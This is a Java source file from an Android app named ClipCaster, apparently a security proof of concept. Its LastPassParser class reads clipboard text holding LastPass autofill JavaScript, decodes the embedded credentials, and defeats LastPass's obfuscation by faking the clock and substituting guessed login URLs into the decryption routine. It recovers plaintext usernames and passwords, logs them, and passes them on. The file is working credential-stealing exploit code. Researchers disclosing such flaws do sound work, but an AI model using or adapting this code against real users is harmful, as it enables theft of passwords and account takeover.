/*
 * Copyright (c) 2014 Xiao Bao Clark
 * All rights reserved.
 *
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions are met:
 *
 * 1. Redistributions of source code must retain the above copyright notice, this
 *    list of conditions and the following disclaimer.
 * 2. Redistributions in binary form must reproduce the above copyright notice,
 *    this list of conditions and the following disclaimer in the documentation
 *    and/or other materials provided with the distribution.
 *
 * THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS" AND
 * ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED
 * WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
 * DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT OWNER OR CONTRIBUTORS BE LIABLE FOR
 * ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES
 * (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES;
 * LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND
 * ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT
 * (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS
 * SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
 *
 * The views and conclusions contained in the software and documentation are those
 * of the authors and should not be interpreted as representing official policies,
 * either expressed or implied, of the FreeBSD Project.
 */

package com.actisec.clipcaster.parser;

import android.content.Context;
import android.util.Base64;
import android.util.Log;

import com.actisec.clipcaster.R;
import com.actisec.clipcaster.ScrapedCredentials;
import com.actisec.clipcaster.ScrapedData;
import com.actisec.clipcaster.ScrapedDataHandler;
import com.actisec.clipcaster.Source;
import com.actisec.clipcaster.util.JavaScript;
import com.evgenii.jsevaluator.JsEvaluator;
import com.evgenii.jsevaluator.interfaces.JsCallback;

import java.util.ArrayList;
import java.util.List;
import java.util.concurrent.ExecutionException;
import java.util.concurrent.TimeUnit;
import java.util.concurrent.TimeoutException;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

/**
 * Created by xiao on 11/11/14.
 */
public class LastPassParser implements ClipParser {

    public static String REGEX = "atob\\(\\'([^']*)\\'\\)";
    public static Pattern PATTERN = Pattern.compile(REGEX);


    final static String
            //var l_f = function (m <leastsigsecond>) -> roundedtime
            FUNC_GETTIME = "l_f",
            //var l_x = function (t <encrypted> , l <lengthofurl> , m <leastsigsecond>) -> decryptedcred
            FUNC_DECRYPT = "l_x",
            //var l_s = function (c <roundedtime + url >) -> secretkey
            FUNC_DOSHA = "l_s";

    final static String
            VAR_INJECTED_URL = "com_actisec_clipcaster_injectedurl";



    static String[] getUrlsToTry(Context context){
        return context.getResources().getStringArray(R.array.login_urls);
    }

    static String[] getUrlsOfLength(Context context, int length){
        List<String> ofLength = new ArrayList<String>();
        String[] fullList = getUrlsToTry(context);
        for(String url: fullList){
            if(url.replaceFirst("https?://","").length() == length){
                ofLength.add(url);
            }
        }
        return ofLength.toArray(new String[ofLength.size()]);
    }


    @Override
    public void onClip(Context context, ScrapedDataHandler handler, String contents) {
        Parser parser = new Parser(context, handler, System.currentTimeMillis());
        parser.getData(contents);
    }

    public static class Parser{
        final Context mContext;
        final ScrapedDataHandler mHandler;
        final ScrapedData mScrapedData;


        public Parser(Context context, ScrapedDataHandler handler, long timeOfEntry) {
            mContext = context;
            mHandler = handler;

            mScrapedData = new ScrapedData();
            mScrapedData.source = new Source();
            mScrapedData.source.timeOfNotification = timeOfEntry;
        }

        public void getData(String string) {

            //  get a matcher object
            Matcher m = PATTERN.matcher(string);
            List<String> creds = new ArrayList<String>(2);
            while (m.find()) {
                creds.add(m.group(1));
            }
            if(creds.isEmpty()){
                return;
            }
            mScrapedData.source.javascriptProgram = string;
            // Try the old way
            mScrapedData.creds = new ScrapedCredentials(new String(Base64.decode(creds.get(0).getBytes(), 0)), new String(Base64.decode(creds.get(1).getBytes(), 0)));
            if (!sCheckString(mScrapedData.creds.user) || !sCheckString(mScrapedData.creds.pass)) {
                mScrapedData.creds = null;
                //Try the new way
                try {
                    getCredsFromJs(string, mScrapedData.source.timeOfNotification);
                } catch (TimeoutException | InterruptedException | ExecutionException e) {
                    Log.e("ClipCaster", "Error getting credentials: " + e.toString());
                    Log.d("ClipCaster", Log.getStackTraceString(e));
                }
            }
        }

        void getCredsFromJs(String js, long time) throws TimeoutException, ExecutionException, InterruptedException {

            JavaScript program = new JavaScript(js);
            String decryptProgram = createDecryptProgram(program, time);

            final String[] userParams = program.getParams(FUNC_DECRYPT, 0),
                    passParams = program.getParams(FUNC_DECRYPT,1);
            if(userParams == null || passParams == null){
                return;
            }

            String[] urls = getUrlsOfLength(mContext, Integer.parseInt(userParams[1]));
            tryDecryption(decryptProgram,userParams,passParams, urls);
        }

        void tryDecryption(String decryptProgram, String[] userParams, String[] passParams, String[] urls) throws TimeoutException, ExecutionException, InterruptedException {
            mScrapedData.creds = new ScrapedCredentials();
            for(String url : urls){
                tryDecryption(createInjectedUrl(url) + decryptProgram,userParams,passParams, new DecryptJsCallback(url));
            }
        }


        void tryDecryption(String decryptProgram, String[] userParams, String[] passParams, JsCallback callback) throws TimeoutException, ExecutionException, InterruptedException {
            String program = decryptProgram + createCall("btoa",new String[] {createCall(FUNC_DECRYPT,userParams) }) + " + \',\' + " + createCall("btoa",new String[] {createCall(FUNC_DECRYPT,passParams) });
            Log.d("TEST", "Getting cred by running " + program);
            new JsEvaluator(mContext).evaluate(program, callback);
        }

        private class DecryptJsCallback implements JsCallback {
            private String mUrl;

            public DecryptJsCallback(String url) {

                mUrl = url;
            }

            @Override
            public void onResult(String result) {
                int commaIdx = result.indexOf(',');
                if(commaIdx <= 0)
                    return;

                Log.d("TEST", "Got " + result);
                String user = new String(Base64.decode(result.substring(0, commaIdx), Base64.DEFAULT));
                Log.d("TEST", "User " + user);
                String pass = new String(Base64.decode(result.substring(commaIdx + 1), Base64.DEFAULT));
                Log.d("TEST", "Pass " + pass);
                if (sCheckString(user) && sCheckString(pass)) {
                    ScrapedData data = new ScrapedData(mScrapedData);
                    data.creds.user = user;
                    data.creds.pass = pass;
                    data.destinationUrl = mUrl;

                    mHandler.handleData(data);
                }
            }
        }
    }





    static String createInjectedUrl(String url){
        return "var " + VAR_INJECTED_URL + "= atob('" + Base64.encodeToString(url.getBytes(),Base64.NO_WRAP) + "');";
    }



    static String createCall(String funcName, String[] args){
        String result = funcName + "(";
        for (int i = 0; i < args.length; i++) {
            String arg = args[i];
            result += arg;
            if(i != args.length - 1){
                result += ',';
            }
        }
        return result + ")";
    }


    static String createDecryptProgram(JavaScript program, long time){
        String decryptFunc = instrumentDecryptFunctionWithLocation(program,VAR_INJECTED_URL);
        String getTimeFunc = instrumentTimeFunction(program, time);
        String shaFunc = program.getFunction(FUNC_DOSHA);
        return getTimeFunc + ';' + shaFunc + ';' + decryptFunc + ';';
    }


    static String instrumentTimeFunction(JavaScript program, long time){
        final String
                CLOCK_OVERRIDE= "Date.prototype.getTime = function(){return " + time + "; };";
        return CLOCK_OVERRIDE + program.getFunction(FUNC_GETTIME);

    }

    static String instrumentDecryptFunctionWithLocation(JavaScript program, String location){
        return program.getFunction(FUNC_DECRYPT).replace("document.location.href",location);
    }


    public static boolean sCheckString(String toCheck) {
        char[] array = toCheck.toCharArray();
        for (char c : array) {
            if (c < 33 || c > 126) {
                return false;
            }
        }
        return true;
    }


}
